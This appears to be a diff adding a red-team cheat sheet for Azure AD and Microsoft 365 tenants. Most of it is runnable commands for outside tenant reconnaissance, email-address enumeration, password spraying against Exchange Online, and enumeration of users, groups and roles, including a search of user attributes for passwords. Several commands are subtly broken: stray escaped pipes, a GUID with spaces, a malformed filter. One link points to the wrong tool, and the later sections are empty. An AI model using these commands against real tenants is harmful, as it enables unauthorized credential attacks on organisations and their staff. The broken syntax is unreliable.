@@ -1,0 +1,118 @@
+## Recon
+#### Recon Azure Tenant using [AADInternals](https://github.com/Gerenios/AADInternals)
+```powershell
+# Get tenant name, authentication, brand name (usually same as directory name) and domain name
+Get-AADIntLoginInformation -UserName root@defcorphq.onmicrosoft.com
+
+# Get Tenant ID
+Get-AADIntTenantID -Domain defcorphq.onmicrosoft.com
+
+# Get Tenant Domain 
+Get-AADIntTenantDomains -Domain deffin.onmicrosoft.com
+
+# Get all information
+Invoke-AADIntReconAsOutsider -DomainName defcorphq.onmicrosoft.com
+```
+
+#### Recon Email IDs using [o365creeper](https://github.com/LMGsec/o365creeper)
+```powershell
+# Enumerate Email IDs by making requests to the `GetCredentialType` API
+python.exe o365creeper.py -f emails.txt -o validemails.txt
+```
+
+#### Recon Azure Services by [microburst](https://github.com/NetSPI/MicroBurst)
+```powershell
+# Enumerates subdomains by subdomain guessing
+Invoke-EnumerateAzureSubDomains -Base defcorphq -Verbose
+```
+
+## Initial Access
+#### Password Spray using [MSOLSPray](https://github.com/dafthack/MSOLSpray)
+```powershell
+# The tool can use **fireprox** to change source IP
+Invoke-MSOLSpray -UserList validemails.txt -Password 'P@ssw0rd' -Verbose
+```
+
+#### Password Spray against the exchange service using [MailSniper](https://github.com/dafthack/MailSniper)
+```powershell
+Invoke-PasswordSprayEWS -ExchHostname outlook.office365.com -UserList gotham-emails.txt -Password Gotham2020
+```
+
+## Enumeration
+#### User Enumeration
+```powershell
+# Enumerate all users
+powershell Get-AzureADUser -All $true
+
+# Enumerate a specific user
+Get-AzureADUser -ObjectId 'test@defcorphq.onmicrosoft.com'
+
+# Search for a user based on string in first characters of DisplayName or userPrincipalName (wildcard not supported)
+Get-AzureADUser -SearchString "admin"
+Get-AzureADUser -All $ |?{$_.Displayname -match "admin"}
+
+# List all attributes for a user
+Get-AzureADUser -ObjectId 'test@defcorphq.onmicrosoft.com' | fl *
+
+# Search attributes for all users that contain the string "password"
+Get-AzureADUser -All $true|%{$Properties = $_;$Properties.PSObject.Properties.Name |${if ($Properties.$_ -match 'password'){"$($Properties.UserPrincipalName) - $_ - $($Properties.$_)"}}}
+
+# All users who are synced from on prem
+Get-AzureADUser -All $true \|? {$_.OnPremisesSecurityIdentifier -ne $null}
+
+# All users who are synced from AzureAD
+Get-AzureADUser -All $true \|? {$_.OnPremisesSecurityIdentifier -eq $null}
+
+# Objects created by any user (use -ObjectId for a specific user)
+Get-AzureADUser \| Get-AzureADUserCreatedObject
+```
+#### Group Enumeration
+```powershell
+# List All Groups
+Get-AzureADGroup -All $true
+
+# Enumerate a specific group
+Get-AzureADGroup -ObjectId 783a312d 0de2 4490 92e4 539b0e4ee03e
+
+# Search for a group based on string in first characters of DisplayName (wildcard not supported)
+Get-AzureADGroup -SearchString "admin" \| fl *
+
+# Search for groups which contain the word "admin" in their name
+Get-AzureADGroup -All $true \|? {$_.Displayname -match "admin"}
+
+# Get Groups that allow Dynamic membership (Note the cmdlet name)
+Get-AzureADMSGroup \|?{$_.GroupTypes -eq 'DynamicMembership'}
+
+# All groups that are synced from on prem (note that security groups are not synced)
+Get-AzureADGroup -All $true \|?{$_.OnPremisesSecurityIdentifier -ne $null }
+
+# All groups that are from Azure AD
+Get-AzureADGroup -All $true \|?{$_.OnPremisesSecurityIdentifier -eq $null }
+
+# Get group members
+Get-AzureADGroupMember -ObjectId 783a312d-0de2-4490-92e4-539b0e4ee03e
+
+# Get groups and roles where the specified user is a member
+Get-AzureADUser -SearchString 'test' \| Get-AzureADUserMembership -ObjectId 'test@defcorphq.onmicrosoft.com'
+```
+#### Role Enumeration
+```powershell
+# Get all available role templates
+Get-AzureADDirectoryroleTemplate
+
+# Get all roles
+Get-AzureADDirectoryRole
+
+# Enumerate users to whom roles are assigned
+Get-AzureADDirectoryRole -Filter "DisplayName" -eq 'GlobalAdministrator' \| Get-AzureADDirectoryRoleMember
+```
+#### Device Enumeration
+```powershell
+
+```
+#### Apps Enumeration
+#### Service Principals Enumeration
+
+### Enumeration Using [ROADTools](https://github.com/dirkjanm/ROADtools)
+### Enumeration Using [AzureHound](https://github.com/dirkjanm/ROADtools)
+### Enumeratin Using [StormSpotter](https://github.com/Azure/Stormspotter)
